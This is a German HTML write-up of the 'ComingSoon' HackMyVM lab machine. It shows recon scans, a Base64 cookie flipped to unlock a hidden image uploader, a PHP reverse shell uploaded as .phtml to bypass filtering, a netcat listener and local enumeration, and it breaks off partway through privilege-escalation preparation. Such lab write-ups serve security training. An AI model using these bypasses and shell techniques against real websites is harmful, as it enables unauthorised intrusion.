@@ -1,0 +1,1056 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ComingSoon - HackMyVM - Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Die CSS-Datei 'style.css' muss die Farben für 'Easy' (Grün/Lime) enthalten -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>ComingSoon - HackMyVM - Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Farbe 'lime' durch CSS -->
+            <h2>Easy</h2>
+            <div class="circle">
+                <!-- Segmentfarben 'lime' durch CSS -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Hintergrundfarbe durch CSS -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">Burp Suite (impliziert)</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">python3 (pty, http.server)</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">env</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">pspy64</div>
+                <div class="tool-item">Metasploit Framework (msfconsole)</div>
+                <div class="tool-item">exploit/multi/handler</div>
+                <div class="tool-item">post/multi/manage/shell_to_meterpreter</div>
+                <div class="tool-item">post/multi/recon/local_exploit_suggester</div>
+                <div class="tool-item">exploit/linux/local/cve_2022_0847_dirtypipe</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access (Hidden Uploader)</a></li>
+                <li><a href="#privilege-escalation-prep">Privilege Escalation Preparation</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Privilege Escalation via Dirty Pipe / Metasploit)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der erste Schritt ist die Identifizierung des Ziels im lokalen Netzwerk mittels `arp-scan -l`.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.116	08:00:27:43:09:83	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein Host mit der IP 192.168.2.116 wurde gefunden. Die MAC-Adresse deutet auf eine VirtualBox VM hin. Dies ist unser Zielsystem "ComingSoon" (`coming.hmv`).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie einen Port-Scan auf 192.168.2.116 durch. Fügen Sie `192.168.2.116 coming.hmv` zur lokalen `/etc/hosts`-Datei hinzu.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Standardempfehlungen zur Netzwerküberwachung und Segmentierung.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein `nmap`-Scan wird auf das Ziel `192.168.2.116` durchgeführt, um offene Ports, Dienste, Versionen und OS-Informationen zu sammeln. Optionen: `-sS` (SYN Scan), `-sC` (Standard Skripte), `-T5` (schnelles Timing), `-A` (Aggressive Optionen), `-p-` (alle TCP-Ports).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.116 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-14 12:15 CET
+Nmap scan report for coming.hmv (192.168.2.116)
+Host is up (0.00012s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
+| ssh-hostkey:
+|   3072 bcfbecb893d4e27876eb1bdc4ba77f9b (RSA)
+|   256 3141a0d7e93c7911c2f081a0fe2df9b0 (ECDSA)
+|_  256 c934170031754dc03aa5b116360dbb18 (ED25519)
+80/tcp open  http    Apache httpd 2.4.51 ((Debian))
+|_http-title: Bolt - Coming Soon Template
+|_http-server-header: Apache/2.4.51 (Debian)
+MAC Address: 08:00:27:43:09:83 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms coming.hmv (192.168.2.116)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in [Scan Duration]
+                    </pre>
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Zwei offene Ports wurden identifiziert:
+                *   **Port 22 (SSH):** OpenSSH 8.4p1 auf Debian. Benötigt Anmeldedaten.
+                *   **Port 80 (HTTP):** Apache 2.4.51 auf Debian. Die Seite hat den Titel "Bolt - Coming Soon Template".
+                Die Hauptangriffsfläche ist der Webserver. SSH ist ein sekundäres Ziel, falls Anmeldedaten gefunden werden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie Web-Enumeration auf Port 80 durch (`gobuster`, `nikto`). Analysieren Sie die Webseite und deren Quellcode auf Hinweise.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Halten Sie Apache und OpenSSH aktuell. Sichern Sie die Konfigurationen beider Dienste. Entfernen Sie Standard-Templates, wenn nicht benötigt.
+            </p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> `gobuster` wird verwendet, um nach Verzeichnissen und Dateien auf dem Webserver zu suchen. Es wird eine breite Palette von Erweiterungen und eine gängige Wortliste genutzt. Die hohe Thread-Anzahl (`-t 100`) soll den Scan beschleunigen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.116 -x txt,php,rar,zip,tar,pem,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e -t 100 -n -k</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.116
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              txt,php,rar,zip,tar,pem,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,kdbx
+[+] Expanded:                true
+[+] Ignore TLS verification: true
+[+] Show Status Codes:       false
+[+] Timeout:                 10s
+===============================================================
+[Scan Start Time] Starting gobuster
+===============================================================
+http://192.168.2.116/index.php            [Size: 3988]
+http://192.168.2.116/assets               [Size: 315] [--> http://192.168.2.116/assets/]
+http://192.168.2.116/license.txt          [Size: 528]
+http://192.168.2.116/notes.txt            [Size: 279]
+===============================================================
+[Scan End Time] Finished
+===============================================================
+                    </pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan fand einige interessante Dateien:
+                *   `index.php`: Die Hauptseite der Anwendung (nicht nur HTML).
+                *   `/assets/`: Verzeichnis für statische Dateien (Bilder, CSS, JS).
+                *   `license.txt`: Lizenzdatei, könnte Hinweise auf die verwendete Software geben.
+                *   `notes.txt`: **Sehr interessant!** Eine Notizdatei könnte wichtige Informationen enthalten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> **Priorität 1:** Laden Sie `notes.txt` herunter und analysieren Sie den Inhalt. Untersuchen Sie auch `license.txt` und den Quellcode von `index.php`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Entfernen Sie sensible Notizen oder Entwicklerkommentare aus öffentlich zugänglichen Bereichen. Überprüfen Sie, ob Lizenzdateien notwendig sind und ob sie sensible Informationen preisgeben.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Inhalt der gefundenen Dateien `notes.txt` und `license.txt` wird angezeigt (vermutlich mittels `curl` heruntergeladen und mit `cat` angezeigt, Schritte nicht explizit gezeigt).
+            </p>
+             <div class="code-block">
+                 <!-- Kein Terminal-Prompt, zeigt Dateiinhalte -->
+                 <pre>
+--- notes.txt ---
+Dave,
+
+Last few jobs to do...
+
+Set ssh to use keys only (passphrase same as the password)
+
+Just need to sort the images out:
+resize and scp them or using the built-in image uploader.
+
+Test the backups and delete anything not needed.
+
+Apply an https certificate.
+
+Cheers,
+
+Webdev
+
+--- license.txt ---
+Thanks for using the free version of Bolt. Please, consider purchasing
+the full version of Bolt to Enjoy All Features and Freedom to Use in
+Commercial Projects.
+
+LIMITATIONS OF FREE VERSION:
+
+1. Commercial Use - Not Allowed
+2. Removing Footer Credit - Not Allowed
+4. All Features - Not Available
+6. Documentation and Support - Not Provided
+7. Royalty Free Images - Not Provided
+
+To purchase commercial license please visit:
+https://uideck.com/products/bolt-free-coming-soon-template/
+and choose commercial license.
+                 </pre>
+             </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong>
+                *   `license.txt`: Bestätigt die Verwendung des "Bolt - Coming Soon Template".
+                *   `notes.txt`: Enthält **entscheidende Hinweise**:
+                    *   SSH soll nur Schlüssel verwenden, aber die **Passphrase für den Schlüssel ist dieselbe wie das (Benutzer-)Passwort**. Dies impliziert, dass es noch Passwort-Login gibt oder gab und dass Passphrase/Passwort identisch sind.
+                    *   Es gibt einen **"built-in image uploader"**. Dies ist ein potenzieller Angriffsvektor für das Hochladen einer Web-Shell.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suchen Sie nach dem "built-in image uploader" auf der Webseite oder in den von `gobuster` gefundenen Pfaden. Untersuchen Sie die `index.php` und die Dateien im `/assets`-Verzeichnis auf Hinweise zum Uploader oder Anmeldedaten. Führen Sie einen `nikto`-Scan durch, um weitere automatisierte Prüfungen durchzuführen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Entfernen Sie interne Notizen. Sichern Sie Dateiupload-Funktionen rigoros ab. Verwenden Sie unterschiedliche Passwörter und Passphrasen. Implementieren Sie Key-only SSH-Authentifizierung korrekt, falls gewünscht.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein `nikto`-Scan wird ausgeführt, um weitere Informationen über den Webserver und potenzielle Schwachstellen zu sammeln.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.116</span></div>
+                     <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.116
++ Target Hostname:    192.168.2.116
++ Target Port:        80
++ Start Time:         2022-11-14 12:25:19 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.51 (Debian)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Cookie RW5hYmxlVXBsb2FkZXIK created without the httponly flag
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-3092: /license.txt: License file found may identify site software.
++ /notes.txt: This might be interesting...
++ 7915 requests: 0 error(s) and 7 item(s) reported on remote host
++ End Time:           2022-11-14 12:27:13 (GMT1) (114 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                     </pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Nikto bestätigt die Funde `license.txt` und `notes.txt` sowie die fehlenden Sicherheitsheader. Der wichtigste neue Fund ist das Cookie `RW5hYmxlVXBsb2FkZXIK`.
+                *   **Cookie-Name:** `RW5hYmxlVXBsb2FkZXIK` ist Base64 für "EnableUploader".
+                *   **Kein `httponly`-Flag:** Das Cookie kann per JavaScript manipuliert werden.
+                *   **Implikation:** Dieses Cookie steuert wahrscheinlich die Sichtbarkeit oder Aktivierung des in `notes.txt` erwähnten Uploaders.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie das Cookie `EnableUploader` genauer. Der Wert (nicht von Nikto gezeigt, muss im Browser oder mit Burp analysiert werden) ist wahrscheinlich Base64 für "false" (`ZmFsc2UK`). Ändern Sie den Wert des Cookies auf Base64 für "true" (`dHJ1ZQ`) und laden Sie die Seite neu, um den Uploader zu aktivieren. Suchen Sie nach dem Uploader-Endpunkt (z.B. im Quellcode nach der Cookie-Änderung).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Setzen Sie das `httponly`-Flag für alle Cookies, die nicht von JavaScript gelesen werden müssen. Verlassen Sie sich nicht auf clientseitige Cookies zur Steuerung serverseitiger Funktionen wie Dateiuploads; implementieren Sie serverseitige Berechtigungsprüfungen.
+            </p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (Hidden Uploader)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Die Analyse des Cookies `RW5hYmxlVXBsb2FkZXIK` (EnableUploader) und dessen Manipulation wird beschrieben.
+                1.  Der ursprüngliche Wert (impliziert) ist Base64 für "false".
+                2.  Der Wert wird manuell (z.B. im Browser-Entwicklertool oder mit Burp Suite) auf `dHJ1ZQ` (Base64 für "true") geändert.
+                3.  Nach dem Neuladen der Seite mit dem geänderten Cookie wird der Uploader unter dem Pfad `/5df03f95b4ff4f4b5dabe53a5a1e15d7.php` sichtbar oder zugänglich. Dieser Pfadname sieht wie ein Hash oder eine zufällige Zeichenfolge aus, was die Entdeckung ohne den Cookie-Hinweis erschwert hätte.
+            </p>
+            <div class="code-block">
+                 <!-- Kein Terminal-Prompt, beschreibt die Cookie-Manipulation und den gefundenen Pfad -->
+                 <pre>
+ d.cookie = "RW5hYmxlVXBsb2FkZXIK=ZmFsc2UK"        // EnableUploader false
+ d.cookie = "RW5hYmxlVXBsb2FkZXIK=dHJ1ZQ"        // EnableUploader true // von mir base64 gesetzt
+
+http://192.168.2.116/5df03f95b4ff4f4b5dabe53a5a1e15d7.php //image Uploader Freigeschaltet
+                 </pre>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Der versteckte Uploader wurde erfolgreich freigeschaltet. Der Pfad `/5df03f95b4ff4f4b5dabe53a5a1e15d7.php` ist nun das Ziel für den Upload einer Web-Shell.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Bereiten Sie eine PHP-Reverse-Shell-Datei vor. Versuchen Sie, diese über den Uploader hochzuladen. Achten Sie auf Dateiendungs- oder Inhaltstyp-Beschränkungen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Entfernen Sie die unsichere Uploader-Funktionalität oder sichern Sie sie ordnungsgemäß mit serverseitiger Authentifizierung und Autorisierung sowie strenger Dateivalidierung.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Eine PHP-Reverse-Shell (`rev.php`) soll hochgeladen werden. Da der Uploader möglicherweise nur bestimmte Dateiendungen (z.B. für Bilder) erlaubt, wird Burp Suite verwendet, um die Anfrage abzufangen und den Dateinamen im `Content-Disposition`-Header von `rev.php` auf `rev.phtml` zu ändern. `.phtml` ist eine alternative Endung für PHP-Dateien, die von manchen Apache-Konfigurationen ausgeführt wird und Filter umgehen kann. Nach dem erfolgreichen Upload wird ein Netcat-Listener auf Port 9001 gestartet, um die eingehende Verbindung der Shell abzufangen.
+            </p>
+             <div class="code-block">
+                 <!-- Kein Terminal-Prompt, beschreibt Burp-Aktion -->
+                 <pre>
+burp : ich hab per Repeater den filenamen der rev.php datei in rev.phtml geändern,
+       hochgeladen und mit netcat einen listener gestartet auf Port 9001
+                 </pre>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+connect to [192.168.2.109] from (UNKNOWN) [192.168.2.116] 39264
+                     </pre> <!-- Annahme: Shell wurde im Browser/curl aufgerufen -->
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> **Initial Access erfolgreich!** Der Upload der als `.phtml` getarnten PHP-Shell war erfolgreich. Der Aufruf der hochgeladenen Datei (Pfad nicht explizit gezeigt, aber vermutlich im Upload-Verzeichnis `/assets/img/` o.ä.) führte zur Ausführung der Reverse Shell, die vom Netcat-Listener empfangen wurde. Der Pentester hat nun eine Shell als `www-data`.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die erhaltene Shell für bessere Interaktivität. Beginnen Sie mit der Enumeration als `www-data`.
+                <br>
+                <strong>Empfehlung (Admin):** **Dringend:** Beheben Sie die Schwachstelle im Dateiuploader. Implementieren Sie serverseitige Prüfungen für Dateitypen und -inhalte. Erlauben Sie keine Ausführung von Skripten in Upload-Verzeichnissen (z.B. durch Apache/nginx-Konfiguration oder Dateisystemberechtigungen). Entfernen Sie die hochgeladene Shell.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die erhaltene Reverse Shell wird für bessere Bedienbarkeit stabilisiert. Es werden Umgebungsvariablen (`TERM`, `SHELL`) gesetzt und `stty` wird verwendet, um die Terminalgröße anzupassen. *Hinweis: Die vollständige Python PTY-Stabilisierung fehlt hier, wird aber oft impliziert oder später nachgeholt.*
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@comingsoon:/$ <span class="command">export TERM=xterm</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt" style="color: yellow;">www-data@comingsoon:/$ <span class="command">export SHELL=bash</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt" style="color: yellow;">www-data@comingsoon:/$ <span class="command">stty rows 24 columns 80</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Die Shell ist nun besser nutzbar für die weitere Enumeration.
+             </p>
+            <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Führen Sie grundlegende Enumerationsbefehle aus (`id`, `pwd`, `ls /home`, `find / -type f -perm -4000`, `sudo -l` etc.).
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Keine neuen Empfehlungen.
+             </p>
+        </section>
+
+        <section id="privilege-escalation-prep">
+             <h2>Privilege Escalation Preparation</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Enumeration als `www-data`. Es wird nach Home-Verzeichnissen, SUID-Dateien, beschreibbaren Dateien/Verzeichnissen, `sudo`-Rechten und Netzwerkverbindungen gesucht.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@comingsoon:/$ <span class="command">ls /home</span></div>
+                     <pre>
+scpuser
+                     </pre>
+                 </div>
+             </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@comingsoon:/$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+      393     64 -rwsr-xr-x   1 root     root        63960 Feb  7  2020 /usr/bin/passwd
+     4367     36 -rwsr-xr-x   1 root     root        35040 Jul 28  2021 /usr/bin/umount
+     3965     72 -rwsr-xr-x   1 root     root        71912 Jul 28  2021 /usr/bin/su
+     3798     44 -rwsr-xr-x   1 root     root        44632 Feb  7  2020 /usr/bin/newgrp
+      390     52 -rwsr-xr-x   1 root     root        52880 Feb  7  2020 /usr/bin/chsh
+      392     88 -rwsr-xr-x   1 root     root        88304 Feb  7  2020 /usr/bin/gpasswd
+     4365     56 -rwsr-xr-x   1 root     root        55528 Jul 28  2021 /usr/bin/mount
+      389     60 -rwsr-xr-x   1 root     root        58416 Feb  7  2020 /usr/bin/chfn
+     4812     52 -rwsr-xr--   1 root     messagebus    51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+    18615    472 -rwsr-xr-x   1 root     root         481608 Mar 13  2021 /usr/lib/openssh/ssh-keysign
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@comingsoon:/$ <span class="command">find / -writable 2>/dev/null | grep -v "/proc"</span></div>
+                     <pre>
+/home/scpuser/.bash_history
+/tmp
+/usr/lib/systemd/system/x11-common.service
+/usr/lib/systemd/system/rcS.service
+/usr/lib/systemd/system/cryptdisks.service
+/var/www/html/assets/img/logo.psd
+/var/www/html/assets/img/rev2.phtml
+/var/www/html/assets/img/logo.png
+/var/www/html/assets/img/hero-area.jpg
+/var/www/html/assets/img/slide1.jpg
+/var/www/html/assets/img/slide2.jpg
+/var/www/html/assets/img/slide3.jpg
+/var/lib/php/sessions
+/var/lock
+/run/systemd/notify
+/run/lock
+/dev/ptmx
+/dev/tty
+/dev/urandom
+/dev/random
+/dev/full
+/dev/zero
+/dev/null
+                     </pre> <!-- Gekürzte Ausgabe -->
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@comingsoon:/$ <span class="command">sudo -l</span></div>
+                     <pre>
+bash: sudo: command not found
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@comingsoon:/var/www/html$ <span class="command">ss -ltupe</span></div>
+                     <pre>
+Netid  State    Recv-Q   Send-Q     Local Address:Port       Peer Address:Port  Process
+udp    UNCONN   0        0                0.0.0.0:bootpc          0.0.0.0:*      ino:11974 sk:1 cgroup:/system.slice/ifup@enp0s3.service <->
+tcp    LISTEN   0        128              0.0.0.0:ssh             0.0.0.0:*      ino:12063 sk:2 cgroup:/system.slice/ssh.service <->
+tcp    LISTEN   0        511                    *:http                  *:*      ino:12104 sk:3 cgroup:/system.slice/apache2.service v6only:0 <->
+tcp    LISTEN   0        128                 [::]:ssh                [::]:*      ino:12074 sk:4 cgroup:/system.slice/ssh.service v6only:1 <->
+                     </pre> <!-- Vereinfachte Ausgabe -->
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong>
+                *   Es gibt einen Benutzer `scpuser`.
+                *   Keine ungewöhnlichen SUID-Dateien gefunden.
+                *   Einige Systemd-Service-Dateien (`/usr/lib/systemd/system/*.service`) sind beschreibbar. Dies ist ein **potenzieller Privilege Escalation Vektor**, da das Ändern dieser Dateien und ein Neustart des Dienstes Code als root ausführen könnte.
+                *   Das Upload-Verzeichnis `/var/www/html/assets/img/` ist beschreibbar.
+                *   `/tmp` ist beschreibbar (Standard).
+                *   `sudo` ist nicht installiert oder nicht im Pfad von `www-data`.
+                *   Netzwerkdienste sind SSH und HTTP.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie das Home-Verzeichnis von `scpuser` auf interessante Dateien. Der beschreibbare Systemd-Service ist ein starker Kandidat für PrivEsc, erfordert aber oft einen Neustart oder eine Interaktion, um getriggert zu werden. Suchen Sie weiter nach einfacheren Wegen, wie z.B. Anmeldedaten für `scpuser`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Korrigieren Sie die Berechtigungen der Systemd-Service-Dateien. Sie sollten nicht für `www-data` beschreibbar sein (`chmod 644`). Stellen Sie sicher, dass Upload-Verzeichnisse korrekte Berechtigungen haben. Installieren Sie `sudo`, wenn es benötigt wird, und konfigurieren Sie es sicher.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Das Home-Verzeichnis des Benutzers `scpuser` wird untersucht. Es werden Dateiberechtigungen, versteckte Dateien und der Inhalt verdächtiger Dateien geprüft.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@comingsoon:/var/www/html$ <span class="command">cd /home/scpuser/</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt" style="color: yellow;">www-data@comingsoon:/home/scpuser$ <span class="command">ls -la</span></div>
+                     <pre>
+total 32
+drwxr-xr-x 4 scpuser scpuser 4096 Dec 17  2021 .
+drwxr-xr-x 3 root    root    4096 Dec 16  2021 ..
+lrwxrwxrwx 1 root    root       9 Dec 15  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 scpuser scpuser  220 Aug  4  2021 .bash_logout
+-rw-r--r-- 1 scpuser scpuser 3526 Aug  4  2021 .bashrc
+drwxr-xr-x 3 scpuser scpuser 4096 Dec 15  2021 .local
+-rw-rw---- 1 scpuser scpuser  123 Dec 16  2021 .oldpasswords
+-rw-r--r-- 1 scpuser scpuser  807 Aug  4  2021 .profile
+drwx------ 2 scpuser scpuser 4096 Dec 15  2021 .ssh
+lrwxrwxrwx 1 root    root      21 Dec 16  2021 user.txt -> /media/flags/user.txt
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@comingsoon:/home/scpuser$ <span class="command">cat /media/flags/user.txt</span></div>
+                     <pre>cat: /media/flags/user.txt: Permission denied</pre>
+                    <div class="prompt" style="color: yellow;">www-data@comingsoon:/home/scpuser$ <span class="command">cat user.txt</span></div>
+                     <pre>cat: user.txt: Permission denied</pre>
+                    <div class="prompt" style="color: yellow;">www-data@comingsoon:/home/scpuser$ <span class="command">cat .oldpasswords</span></div>
+                     <pre>cat: .oldpasswords: Permission denied</pre>
+                 </div>
+             </div>
+             <!-- Weitere ls und cd Befehle zur Untersuchung von .local und .ssh -->
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@comingsoon:/home/scpuser$ <span class="command">cd .local</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt" style="color: yellow;">www-data@comingsoon:/home/scpuser/.local$ <span class="command">ls -la</span></div>
+                     <pre>
+total 12
+drwxr-xr-x 3 scpuser scpuser 4096 Dec 15  2021 .
+drwxr-xr-x 4 scpuser scpuser 4096 Dec 17  2021 ..
+drwx------ 3 scpuser scpuser 4096 Dec 15  2021 share
+                     </pre>
+                    <div class="prompt" style="color: yellow;">www-data@comingsoon:/home/scpuser/.local$ <span class="command">cd share/</span></div>
+                    <pre>bash: cd: share/: Permission denied</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@comingsoon:/home/scpuser$ <span class="command">echo "ddd" > .ssh/bent</span></div>
+                     <pre>bash: .ssh/bent: Permission denied</pre>
+                 </div>
+             </div>
+              <!-- Überprüfung von /etc/passwd und /etc/shadow -->
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@comingsoon:/home/scpuser$ <span class="command">ls -la /etc/passwd</span></div>
+                     <pre>-rw-r--r-- 1 root root 1475 Dec 16  2021 /etc/passwd</pre>
+                    <div class="prompt" style="color: yellow;">www-data@comingsoon:/home/scpuser$ <span class="command">ls -la /etc/shadow</span></div>
+                     <pre>-rw-r----- 1 root shadow 911 Dec 16  2021 /etc/shadow</pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong>
+                *   Die Datei `user.txt` ist ein Symlink auf `/media/flags/user.txt`. Beide sind für `www-data` nicht lesbar.
+                *   Die Datei `.oldpasswords` existiert, ist aber ebenfalls nicht lesbar für `www-data`.
+                *   Die Verzeichnisse `.local/share` und `.ssh` sind für `www-data` nicht zugänglich.
+                *   `/etc/shadow` ist nicht für `www-data` lesbar.
+                Es wurden keine direkten Anmeldedaten oder einfachen PrivEsc-Vektoren im Home-Verzeichnis gefunden. Der Fokus muss auf anderen Methoden liegen, wie der Ausnutzung der beschreibbaren Systemd-Dateien oder der Prozessüberwachung.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuchen Sie, laufende Prozesse und Cron-Jobs zu überwachen, um potenzielle Schwachstellen oder Anmeldedaten zu finden. Verwenden Sie Tools wie `pspy` oder `linpeas.sh`. Untersuchen Sie die beschreibbaren Systemd-Dateien genauer.
+                <br>
